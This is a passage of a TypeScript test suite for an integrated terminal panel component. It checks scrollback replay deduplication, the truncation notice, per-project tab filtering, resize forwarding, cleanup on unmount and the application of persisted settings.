  it('keeps the live stream alive when the history call fails', async () => {
    // The panel swallows the rejection (no toast, no banner) and must
    // still flip historyReady so live bytes flow straight through.
    vi.mocked(api.terminalHistory).mockRejectedValue(new Error('no ring'))
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    const { terminalId } = await vi.mocked(api.terminalSpawn).mock.results[0]!.value
    h.outputHandler?.({ terminalId, data: encode('still-live') })
    await waitFor(() => expect(rendered(h.terminals[0])).toBe('still-live'))
  })

  it('drops queued live events already covered by the snapshot (seq ≤ endSeq) and flushes the rest in order', async () => {
    // Review fix (duplication window): the history invoke can resolve
    // after the listeners attached, so events emitted in the
    // attach→snapshot window land in BOTH the backend ring (replayed via
    // the snapshot) and the pending queue. Queued events with
    // seq ≤ endSeq must be DROPPED (not written twice); strictly newer
    // ones flush in arrival (stream) order.
    let resolveHistory: (v: { data: string; endSeq?: number }) => void = () => {}
    vi.mocked(api.terminalHistory).mockImplementation(
      () => new Promise((resolve) => { resolveHistory = resolve }),
    )
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    const { terminalId } = await vi.mocked(api.terminalSpawn).mock.results[0]!.value
    h.outputHandler?.({ terminalId, data: encode('DUP-1'), seq: 1 })
    h.outputHandler?.({ terminalId, data: encode('DUP-2'), seq: 2 })
    h.outputHandler?.({ terminalId, data: encode('LIVE-3'), seq: 3 })
    expect(rendered(h.terminals[0])).toBe('')
    resolveHistory({ data: encode('SNAPSHOT'), endSeq: 2 })
    await waitFor(() => expect(rendered(h.terminals[0])).toBe('SNAPSHOTLIVE-3'))
    expect(rendered(h.terminals[0])).not.toContain('DUP-1')
    expect(rendered(h.terminals[0])).not.toContain('DUP-2')
  })

  it('flushes a queued seq-0 event when the snapshot is EMPTY (reaped-session shape)', async () => {
    // seq-0 overload, regression: `("", endSeq: 0)` is the shape history()
    // answers for an unknown id / reaped session — an EMPTY snapshot. seq 0
    // is also a legitimate watermark (see the guard-rail test below), but
    // an empty snapshot contains none of the queued event's bytes, so the
    // event must be WRITTEN (it used to be dropped as "already replayed",
    // losing the terminal's final output).
    let resolveHistory: (v: { data: string; endSeq?: number }) => void = () => {}
    vi.mocked(api.terminalHistory).mockImplementation(
      () => new Promise((resolve) => { resolveHistory = resolve }),
    )
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    const { terminalId } = await vi.mocked(api.terminalSpawn).mock.results[0]!.value
    h.outputHandler?.({ terminalId, data: encode('FINAL-CHUNK'), seq: 0 })
    expect(rendered(h.terminals[0])).toBe('')
    resolveHistory({ data: '', endSeq: 0 })
    await waitFor(() => expect(rendered(h.terminals[0])).toBe('FINAL-CHUNK'))
  })

  it('still drops a queued seq-0 event when a NON-EMPTY snapshot covers chunk 0', async () => {
    // seq-0 overload, guard-rail: a snapshot with bytes and endSeq 0
    // legitimately contains exactly chunk 0 — the drop predicate must keep
    // applying there (writing the queued seq-0 event would duplicate it).
    let resolveHistory: (v: { data: string; endSeq?: number }) => void = () => {}
    vi.mocked(api.terminalHistory).mockImplementation(
      () => new Promise((resolve) => { resolveHistory = resolve }),
    )
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    const { terminalId } = await vi.mocked(api.terminalSpawn).mock.results[0]!.value
    h.outputHandler?.({ terminalId, data: encode('CHUNK-ZERO'), seq: 0 })
    h.outputHandler?.({ terminalId, data: encode('CHUNK-ONE'), seq: 1 })
    expect(rendered(h.terminals[0])).toBe('')
    resolveHistory({ data: encode('CHUNK-ZERO'), endSeq: 0 })
    await waitFor(() => expect(rendered(h.terminals[0])).toBe('CHUNK-ZEROCHUNK-ONE'))
  })

  it('flushes seq-marked queued events when the snapshot carries no endSeq (legacy backend)', async () => {
    // No endSeq on the response (demo backend, legacy payload): the
    // conservative fallback keeps the old flush-everything behavior.
    let resolveHistory: (v: { data: string; endSeq?: number }) => void = () => {}
    vi.mocked(api.terminalHistory).mockImplementation(
      () => new Promise((resolve) => { resolveHistory = resolve }),
    )
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    const { terminalId } = await vi.mocked(api.terminalSpawn).mock.results[0]!.value
    h.outputHandler?.({ terminalId, data: encode('SEQD-LEGACY'), seq: 5 })
    resolveHistory({ data: encode('HIST') })
    await waitFor(() => expect(rendered(h.terminals[0])).toBe('HISTSEQD-LEGACY'))
  })

  it('writes the replay truncation notice BEFORE the history bytes when truncated', async () => {
    // Additive `truncated` flag: the backend ring evicted older scrollback,
    // so the replay must not restore silently — the dim in-stream notice
    // goes out as its own write BEFORE the history bytes (order observable
    // per mocked write call), and `data` stays pure bytes (never baked into
    // the notice).
    vi.mocked(api.terminalHistory).mockResolvedValue({
      data: encode('TAIL-ONLY'), endSeq: 9, truncated: true,
    })
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    await waitFor(() => expect(h.terminals[0].written.length).toBe(2))
    const notice = new TextDecoder().decode(h.terminals[0].written[0]!)
    const history = new TextDecoder().decode(h.terminals[0].written[1]!)
    expect(notice).toBe(
      '\r\n\u{1b}[2m[shannon: replayed only the most recent output — earlier scrollback was dropped]\u{1b}[0m\r\n',
    )
    expect(history).toBe('TAIL-ONLY')
  })

  it('issues the history fetch only after both terminal listeners resolved', async () => {
    // Review fix (loss window): the fetch used to be issued before the
    // listen promises resolved, so output between the backend's ring
    // snapshot and listener registration was neither replayed nor
    // delivered. The fetch must wait for BOTH subscriptions.
    let resolveOutput: () => void = () => {}
    let resolveExit: () => void = () => {}
    h.gateOutput = new Promise<void>((r) => { resolveOutput = r })
    h.gateExit = new Promise<void>((r) => { resolveExit = r })
    await openPanel()
    // Both handlers are registered synchronously by the transports…
    await waitFor(() => expect(h.outputHandler).toBeTruthy())
    await waitFor(() => expect(h.exitHandler).toBeTruthy())
    // …but unresolved: let every pending microtask/task settle, and the
    // fetch must still not have been issued.
    await new Promise((r) => setTimeout(r, 10))
    expect(api.terminalHistory).not.toHaveBeenCalled()
    resolveOutput()
    await new Promise((r) => setTimeout(r, 10))
    expect(api.terminalHistory).not.toHaveBeenCalled()
    // Only once BOTH listener promises resolve does the fetch go out.
    resolveExit()
    await waitFor(() => expect(api.terminalHistory).toHaveBeenCalledTimes(1))
  })
})

describe('TerminalPanel (per-project tabs — US7)', () => {
  it('hides tabs from other projects', async () => {
    vi.mocked(api.terminalList).mockResolvedValue([info('t-mine', '/home/u/demo'), info('t-theirs', '/other/project')])
    render(<TerminalPanel projectDir="/home/u/demo" />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    expect(await screen.findByRole('tab', { name: /demo/ })).toBeTruthy()
    expect(screen.queryByRole('tab', { name: /project/ })).toBeNull()
  })

  it('counts hidden tabs toward the global cap — the filter is view-only', async () => {
    // Hidden tabs keep RUNNING and the ≤4 cap is backend-global, so the +
    // button must read the full tab list, not the filtered one.
    vi.mocked(api.terminalList).mockResolvedValue([
      info('t-mine', '/home/u/demo'),
      info('t-1', '/other/a'), info('t-2', '/other/b'), info('t-3', '/other/c'),
    ])
    render(<TerminalPanel projectDir="/home/u/demo" />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    expect(await screen.findByRole('tab', { name: /demo/ })).toBeTruthy()
    // Only this project's tab renders (and mounts a term).
    expect(screen.getAllByRole('tab')).toHaveLength(1)
    await waitFor(() => expect(h.terminals.length).toBe(1))
    const plus = screen.getByRole('button', { name: 'New terminal' })
    expect(plus.getAttribute('aria-disabled')).toBe('true')
    expect(plus.getAttribute('title')).toContain('limit reached (4)')
  })

  it('shows all terminals when the projectDir prop is null', async () => {
    vi.mocked(api.terminalList).mockResolvedValue([info('t-a', '/home/u/demo'), info('t-b', '/other')])
    render(<TerminalPanel projectDir={null} />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    expect(await screen.findByRole('tab', { name: /demo/ })).toBeTruthy()
    expect(screen.getByRole('tab', { name: /other/ })).toBeTruthy()
  })

  it('still matches tabs whose stored dir is canonicalized, via projectDirRaw', async () => {
    // Review fix: the backend canonicalizes `projectDir` before storing
    // (symlinked segments on Unix, `\\?\C:\…` verbatim prefixes on
    // Windows). The filter must match the panel's RAW prop against the
    // additive `projectDirRaw` first — an exact match on the canonical
    // field alone used to make such tabs vanish into the empty state.
    vi.mocked(api.terminalList).mockResolvedValue([
      // Canonical ≠ raw prop: only visible through projectDirRaw.
      { terminalId: 't-raw', projectDir: '/run/user/1000/symlinked/demo', projectDirRaw: '/home/u/demo', shell: '/bin/zsh', startedAtMs: 1 },
      // Legacy payload without the raw field: falls back to projectDir.
      { terminalId: 't-canon', projectDir: '/home/u/demo', shell: '/bin/zsh', startedAtMs: 2 },
      // Matches neither form: stays hidden.
      { terminalId: 't-other', projectDir: '/elsewhere', projectDirRaw: '/also-elsewhere', shell: '', startedAtMs: 3 },
    ])
    render(<TerminalPanel projectDir="/home/u/demo" />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    await waitFor(() => expect(screen.getAllByRole('tab', { name: /demo/ })).toHaveLength(2))
    expect(screen.queryByRole('tab', { name: /elsewhere/ })).toBeNull()
  })

  it('keeps a freshly spawned tab visible after the canonical terminal_list merge', async () => {
    // The spawn flow's authoritative merge replaces the optimistic
    // raw-path info with the backend's canonical string; the raw field
    // riding along must keep the tab matched (it used to vanish).
    const merged: TerminalInfo = {
      terminalId: 't-raw',
      projectDir: '/run/user/1000/symlinked/demo',
      projectDirRaw: '/home/u/demo',
      shell: '/bin/zsh',
      startedAtMs: 7,
    }
    vi.mocked(api.terminalSpawn).mockResolvedValue({ terminalId: 't-raw' })
    vi.mocked(api.terminalList).mockResolvedValueOnce([]).mockResolvedValueOnce([merged])
    render(<TerminalPanel projectDir="/home/u/demo" />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    expect(await screen.findByRole('tab', { name: /demo/ })).toBeTruthy()
    // The follow-up list merge ran — and the tab survived it (no empty
    // state where the tab used to be).
    await waitFor(() => expect(api.terminalList).toHaveBeenCalledTimes(2))
    expect(screen.queryByRole('tab', { name: /demo/ })).toBeTruthy()
    expect(screen.queryByText(/No open terminals/)).toBeNull()
  })

  it('shows the empty state without auto-spawning when every tab belongs to another project', async () => {
    // US7: a filter that hides everything must NOT spawn a replacement —
    // the hidden terminals are still running elsewhere.
    vi.mocked(api.terminalList).mockResolvedValue([info('t-elsewhere', '/other/project')])
    render(<TerminalPanel projectDir="/home/u/demo" />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    expect(await screen.findByText(/No open terminals/)).toBeTruthy()
    expect(screen.queryAllByRole('tab')).toHaveLength(0)
    expect(api.terminalSpawn).not.toHaveBeenCalled()
  })

  it('re-filters when the projectDir prop changes (session switch)', async () => {
    vi.mocked(api.terminalList).mockResolvedValue([info('t-a', '/home/u/demo'), info('t-b', '/other')])
    const view = render(<TerminalPanel projectDir="/home/u/demo" />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    expect(await screen.findByRole('tab', { name: /demo/ })).toBeTruthy()
    expect(screen.queryByRole('tab', { name: /other/ })).toBeNull()
    view.rerender(<TerminalPanel projectDir="/other" />)
    await waitFor(() => expect(screen.getByRole('tab', { name: /other/ })).toBeTruthy())
    expect(screen.queryByRole('tab', { name: /demo/ })).toBeNull()
    // …and back.
    view.rerender(<TerminalPanel projectDir="/home/u/demo" />)
    await waitFor(() => expect(screen.getByRole('tab', { name: /demo/ })).toBeTruthy())
    expect(screen.queryByRole('tab', { name: /other/ })).toBeNull()
  })
})

describe('TerminalPanel (P2-4: resize IPC, cleanup, list merge, settings)', () => {
  it('pushes the fitted cols/rows to terminal_resize when the drawer resizes', async () => {
    // jsdom lacks ResizeObserver — stub it and drive the observer callback
    // the way a real container resize would.
    class MockResizeObserver {
      static latest: MockResizeObserver | null = null
      cb: ResizeObserverCallback
      constructor(cb: ResizeObserverCallback) {
        this.cb = cb
        MockResizeObserver.latest = this
      }
      observe() {}
      unobserve() {}
      disconnect() {}
    }
    vi.stubGlobal('ResizeObserver', MockResizeObserver)
    try {
      await openPanel()
      await waitFor(() => expect(h.terminals.length).toBe(1))
      const { terminalId } = await vi.mocked(api.terminalSpawn).mock.results[0]!.value
      // Real xterm: fit() measures and fires the onResize handler — the
      // panel then forwards cols/rows to the pty. Simulate that pair.
      h.fits[0].fit = () => h.terminals[0].resizeHandler?.({ cols: 101, rows: 30 })
      expect(api.terminalResize).not.toHaveBeenCalled()
      await act(async () => {
        MockResizeObserver.latest?.cb([], undefined as unknown as ResizeObserver)
      })
      expect(api.terminalResize).toHaveBeenCalledWith(terminalId, 101, 30)
    } finally {
      vi.unstubAllGlobals()
    }
  })

  it('unsubscribes listeners and disposes xterm resources on unmount', async () => {
    const { unmount } = render(<TerminalPanel projectDir="/home/u/demo" />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    await waitFor(() => expect(h.terminals.length).toBe(1))
    expect(h.unsubscribed).toBe(false)
    expect(h.exitUnsubscribed).toBe(false)

    unmount()

    // Both transports unsubscribed…
    expect(h.unsubscribed).toBe(true)
    expect(h.exitUnsubscribed).toBe(true)
    // …and the xterm/fit pair is disposed, not leaked.
    expect(h.terminals[0].disposed).toBe(true)
    expect(h.fits[0].disposed).toBe(true)
  })

  it('merges the follow-up terminal_list result into the spawned tab info', async () => {
    // Boot sees no live terminals, so the panel spawns; the authoritative
    // list answer (real shell/startedAtMs/projectDir) replaces the
    // optimistic placeholder info wholesale. projectDir={null} keeps every
    // tab visible (US7) so the merged label flip is observable.
    const fresh: TerminalInfo = { terminalId: 't-fresh', projectDir: '/fresh/dir', shell: '/bin/zsh', startedAtMs: 42 }
    vi.mocked(api.terminalList).mockResolvedValueOnce([]).mockResolvedValueOnce([fresh])
    vi.mocked(api.terminalSpawn).mockResolvedValue({ terminalId: 't-fresh' })
    render(<TerminalPanel projectDir={null} />)
    fireEvent.keyDown(window, { key: '`', ctrlKey: true })
    // The tab label flips from the optimistic projectDir ('demo') to the
    // authoritative one ('dir') — impossible unless the follow-up list
    // result was merged over the placeholder.
    expect(await screen.findByRole('tab', { name: /dir/ })).toBeTruthy()
    expect(screen.queryByRole('tab', { name: /demo/ })).toBeNull()
    // Exactly two list calls: the boot reconciliation + the post-spawn refresh.
    expect(api.terminalList).toHaveBeenCalledTimes(2)
  })

  it('toggles the panel from Ctrl+` while focus is inside the terminal surface', async () => {
    // The capture-phase window handler must win over xterm's hidden
    // textarea key handling when the surface itself holds focus.
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    const surface = screen.getByTestId('terminal-surface')
    // The real surface hosts xterm's focusable textarea; give the fake the
    // same programmatic focusability.
    surface.setAttribute('tabindex', '-1')
    surface.focus()
    expect(surface).toHaveFocus()
    fireEvent.keyDown(surface, { key: '`', ctrlKey: true })
    await waitFor(() =>
      expect(screen.queryByRole('region', { name: 'Integrated terminal' })).toBeNull(),
    )
  })

  it('applies persisted settings to newly created xterm instances', async () => {
    // P3-1: settings fetched on boot are read at CREATION time — the
    // first xterm of the session must carry fontSize/scrollback/
    // screenReaderMode, and the drawer height follows drawerHeight.
    vi.mocked(api.terminalGetSettings).mockResolvedValue({
      shell: null, fontSize: 15, scrollback: 1234, drawerHeight: 480, screenReaderMode: true,
    })
    await openPanel()
    await waitFor(() => expect(h.terminals.length).toBe(1))
    expect(h.terminals[0].options.fontSize).toBe(15)
    expect(h.terminals[0].options.scrollback).toBe(1234)
    expect(h.terminals[0].options.screenReaderMode).toBe(true)
    const region = screen.getByRole('region', { name: 'Integrated terminal' })
    expect(region.getAttribute('style')).toContain('height: 480px')
  })
})
